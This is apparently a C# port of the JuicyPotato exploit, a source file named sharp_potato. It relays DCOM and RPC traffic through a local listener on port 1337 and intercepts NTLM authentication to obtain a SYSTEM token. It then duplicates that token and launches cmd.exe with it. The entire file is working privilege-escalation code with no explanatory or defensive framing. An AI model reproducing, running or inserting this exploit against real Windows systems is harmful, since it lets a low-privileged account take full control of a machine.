using System.Collections.Concurrent;
using System.Net;
using System.Net.Sockets;
using System.Text;
using Vanara.InteropServices;
using Vanara.PInvoke;
using static Vanara.PInvoke.Ole32;
using static Vanara.PInvoke.AdvApi32;
using static Vanara.PInvoke.Kernel32;
using static Vanara.PInvoke.Secur32;

namespace sharp_potato;

public unsafe class JuicyPotato
{
    public bool EnableDebugLogging { get; set; } = false;
    public Guid CLSID { get; set; } = Guid.Parse("03ca98d6-ff5d-49b8-abc6-03dd84127020");
    public IPEndPoint ComServerEndPoint { get; set; } = new(IPAddress.Loopback, 1337);
    public IPEndPoint RpcServerEndPoint { get; set; } = new(IPAddress.Loopback, 135);
    public LocalNegotiator Negotiator { get; } = new();

    private const int BUFFER_LENGTH = 4096;
    private readonly BlockingCollection<byte[]> queueSendCom = new();
    private readonly BlockingCollection<byte[]> queueSendRpc = new();
    private Thread comListenerThread;
    private Thread rpcConnectionThread;
    private bool newConnection;

    public void StartRPCConnectionThread()
    {
        rpcConnectionThread = new Thread(StartRPCConnection);
        rpcConnectionThread.Start();
    }

    public void StartCOMListenerThread()
    {
        comListenerThread = new Thread(StartCOMListener);
        comListenerThread.Start();
    }

    private void StartCOMListener()
    {
        if (EnableDebugLogging)
            Console.Write($"COM> startCOMListener ({ComServerEndPoint.Port})\n");

        var listener = new TcpListener(ComServerEndPoint);
        listener.Start();

        var client = listener.AcceptTcpClient();

        var receiveBuffer = new byte[BUFFER_LENGTH];
        int iResult;
        do
        {
            iResult = client.GetStream().Read(receiveBuffer, 0, BUFFER_LENGTH);
            if (EnableDebugLogging)
                Console.Write($"COM> Read result: {iResult} from COM (1337 <- COM)\n");
            if (iResult > 0)
            {
                fixed (byte* ptrReceiveBuffer = receiveBuffer)
                    ProcessNtlmBytes(ptrReceiveBuffer, iResult);

                if (EnableDebugLogging)
                    Console.Write($"COM> Adding {iResult} bytes to RPC_Queue\n");
                queueSendRpc.Add(receiveBuffer[..iResult]);

                var buffer = queueSendCom.Take();
                if (EnableDebugLogging)
                    Console.Write($"COM> Popped {buffer.Length} bytes from COM_Queue\n");

                fixed (byte* ptrSendBuffer = buffer)
                    ProcessNtlmBytes(ptrSendBuffer, buffer.Length);

                if (EnableDebugLogging)
                    Console.Write($"COM> Sending {buffer.Length} bytes to COM (1337 -> COM)\n");
                client.GetStream().Write(buffer, 0, buffer.Length);

                Thread.Sleep(10);
                newConnection = listener.Pending();
                if (newConnection)
                {
                    if (EnableDebugLogging)
                        Console.Write("COM> New TCP connection is pending, accepting.\n");
                    client.Close();
                    client = listener.AcceptTcpClient();
                }
            }
            else if (iResult == 0)
            {
                client.Close();
                Environment.Exit(-1);
            }
            else
            {
                Console.Write($"COM> ERR: recv failed with error: {iResult}\n");
                client.Close();
                Environment.Exit(-1);
            }
        } while (iResult > 0);

        client.Close();
    }

    private void StartRPCConnection()
    {
        if (EnableDebugLogging)
            Console.Write("                                             RPC> startRPCConnection\n");

        var client = new TcpClient();
        client.Connect(RpcServerEndPoint);

        byte[] receiveBuffer = new byte[BUFFER_LENGTH];
        int iResult;
        do
        {
            var buffer = queueSendRpc.Take();
            if (EnableDebugLogging)
                Console.Write($"                                             RPC> Popped item from RPC_Queue ({buffer.Length} bytes)\n");

            if (newConnection)
            {
                if (EnableDebugLogging)
                    Console.Write("                                             RPC> startRPCConnection -> newConnection was 1\n");
                client = new TcpClient();
                client.Connect(RpcServerEndPoint);
                newConnection = false;
            }

            if (EnableDebugLogging)
                Console.Write($"                                             RPC> Writing {buffer.Length} bytes to RDP (this -> 135)\n");
            client.GetStream().Write(buffer, 0, buffer.Length);

            iResult = client.GetStream().Read(receiveBuffer, 0, BUFFER_LENGTH);
            if (EnableDebugLogging)
                Console.Write($"                                             RPC> Read {iResult} bytes from RDP (this <- 135)\n");
            if (iResult > 0)
            {
                if (EnableDebugLogging)
                    Console.Write($"                                             RPC> Adding {iResult} bytes to COM_Queue\n");
                queueSendCom.Add(receiveBuffer[..iResult]);
            }
            else if (iResult == 0)
            {
                if (EnableDebugLogging)
                    Console.Write("                                             RPC> Connection closed\n");
            }
            else
            {
                Console.Write($"                                             RPC> ERR: recv failed with error: {iResult}\n");
                return;
            }
        } while (iResult > 0);

        client.Close();
    }

    private static int FindNTLMBytes(byte* bytes, int length)
    {
        var pattern = new byte[] {0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50};
        int pIdx = 0;
        int i;
        for (i = 0; i < length; i++)
        {
            if (bytes[i] == pattern[pIdx])
            {
                pIdx += 1;
                if (pIdx == 7) return (i - 6);
            }
            else
            {
                pIdx = 0;
            }
        }

        return -1;
    }

    private int ProcessNtlmBytes(byte* bytes, int length)
    {
        int ntlmLoc = FindNTLMBytes(bytes, length);
        if (ntlmLoc == -1) return -1;

        int messageType = bytes[ntlmLoc + 8];
        if (EnableDebugLogging)
            Console.Write($"[NTLM/{length}] Will handle {length - ntlmLoc} bytes starting from {ntlmLoc} (type = {messageType})\n");
        switch (messageType)
        {
            case 1:
                Negotiator.HandleType1(bytes + ntlmLoc, length - ntlmLoc);
                break;
            case 2:
                Negotiator.HandleType2(bytes + ntlmLoc, length - ntlmLoc);
                break;
            case 3:
                Negotiator.HandleType3(bytes + ntlmLoc, length - ntlmLoc);
                break;
            default:
                Console.Out.WriteLine("Error - Unknown NTLM message type...");
                return -1;
        }

        return 0;
    }

    public void TriggerDCOM()
    {
        if (EnableDebugLogging)
            Console.Out.WriteLine("TriggerDCOM");

        CoInitialize(IntPtr.Zero);
        CreateILockBytesOnHGlobal(IntPtr.Zero, true, out var lb);
        StgCreateDocfileOnILockBytes(lb, STGM.STGM_CREATE | STGM.STGM_READWRITE | STGM.STGM_SHARE_EXCLUSIVE, 0, out var stg);

        var t = new StorageTrigger(stg, ComServerEndPoint);

        var tmp = Guid.Parse("00000000-0000-0000-C000-000000000046");
        var qis = new MULTI_QI[]
        {
            new()
            {
                pIID = new GuidPtr(tmp),
                pItf = null,
                hr = 0
            }
        };

        CoGetInstanceFromIStorage(null, CLSID, null, CLSCTX.CLSCTX_LOCAL_SERVER, t, 1, qis);

        if (EnableDebugLogging)
            Console.Out.WriteLine("TriggerDCOM End");
    }

    public void WaitForAuth()
    {
        while (Negotiator.AuthResult != 0)
            Thread.Sleep(100);
    }

    public bool CreateProcess()
    {
        if (!OpenProcessToken(GetCurrentProcess(), TokenAccess.TOKEN_ALL_ACCESS, out var hToken))
            return false;

        EnablePrivilege(hToken, "SeImpersonatePrivilege");
        EnablePrivilege(hToken, "SeAssignPrimaryTokenPrivilege");
        OpenProcessToken(GetCurrentProcess(), TokenAccess.TOKEN_ALL_ACCESS, out hToken);
        QuerySecurityContextToken(Negotiator.Context, out var elevatedToken);
        // IsTokenSystem(hToken); // TODO

        var tokenType = elevatedToken.GetInfo<TOKEN_TYPE>();
        if (EnableDebugLogging)
            Console.Out.WriteLine(tokenType);

        DuplicateTokenEx(elevatedToken, TokenAccess.TOKEN_ALL_ACCESS, null,
            SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out var dupedToken);

        tokenType = dupedToken.GetInfo<TOKEN_TYPE>();
        if (EnableDebugLogging)
            Console.Out.WriteLine(tokenType);

        CreateProcessWithTokenW(dupedToken, 0, "cmd.exe", new StringBuilder("cmd.exe"),
            0, null, null, new STARTUPINFO {lpDesktop = "winsta0\\default"}, out var processInformation);

        Console.Out.WriteLine("PID=" + processInformation.dwProcessId);

        return false;
    }

    private bool EnablePrivilege(SafeHTOKEN token, string privilege)
    {
        if (!LookupPrivilegeValue(null, privilege, out var luid))
        {
            Console.Out.WriteLine("LookupPrivilegeValue failed!");
            return false;
        }

        var tp = new TOKEN_PRIVILEGES();
        tp.PrivilegeCount = 1;
        tp.Privileges = new[] {new LUID_AND_ATTRIBUTES(luid, PrivilegeAttributes.SE_PRIVILEGE_ENABLED)};
        if (!AdjustTokenPrivileges(token, false, tp, out _).Succeeded)
        {
            Console.Out.WriteLine("AdjustTokenPrivileges failed!");
            return false;
        }

        return true;
    }

    private bool IsTokenSystem(SafeHTOKEN token)
    {
        Console.Out.WriteLine("IsTokenSystem");

        var tokenUser = token.GetInfo<TOKEN_USER>(TOKEN_INFORMATION_CLASS.TokenUser);

        Console.Out.WriteLine(tokenUser.User.Sid.GetBinaryForm().Length);

        var sid = tokenUser.User.Sid.GetBinaryForm();

        var userName = new StringBuilder(64);
        var domainName = new StringBuilder(64);

        int userNameSize = 64;
        int domainNameSize = 64;

        LookupAccountSid(null, sid, userName, ref userNameSize, domainName, ref domainNameSize, out _);
        Console.Out.WriteLine($"{domainName}\\{userName}");

        return false;
    }
}